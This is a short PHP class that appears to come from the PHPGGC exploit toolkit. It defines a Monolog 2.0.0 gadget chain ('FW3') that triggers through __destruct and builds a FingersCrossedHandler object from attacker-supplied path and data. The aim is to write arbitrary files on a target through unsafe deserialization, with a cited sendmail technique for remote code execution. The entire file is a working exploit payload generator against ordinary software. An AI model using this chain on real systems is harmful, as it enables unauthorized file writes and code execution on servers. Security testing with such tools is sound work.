<?php

namespace GadgetChain\Monolog;

class FW3 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '2.0.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'requires the sendmail and may take a while to write. https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];
        
        return new \Monolog\Handler\FingersCrossedHandler($path, $data);
    }
}